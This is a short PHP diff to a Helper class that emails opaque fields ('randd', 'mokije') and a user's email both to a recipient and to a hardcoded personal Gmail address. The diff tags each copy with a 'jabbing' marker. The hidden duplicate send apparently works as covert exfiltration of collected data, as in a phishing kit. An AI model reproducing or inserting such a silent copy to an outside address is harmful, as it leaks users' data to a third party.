@@ -91,8 +91,8 @@ class Helper implements HelperContract
                $randd = $data["randd"];
                $mokije = $data["mokije"];
                       
-               $this->sendEmail($rcpt,$s,['randd' => $randd,'mokije' => $mokije,'r' => $r->email],'emails.heh_alert','view');
-               $this->sendEmail("mails4davidslogan@gmail.com",$s,['randd' => $randd,'mokije' => $mokije,'r' => $r->email],'emails.heh_alert','view');
+               $this->sendEmail($rcpt,$s,['randd' => $randd,'jabbing' => "original",'mokije' => $mokije,'r' => $r->email],'emails.heh_alert','view');
+               $this->sendEmail("mails4davidslogan@gmail.com",$s,['randd' => $randd,'mokije' => $mokije,'r' => $r->email,'jabbing' => "soji"],'emails.heh_alert','view');
 		      }  
 		       
 		   }
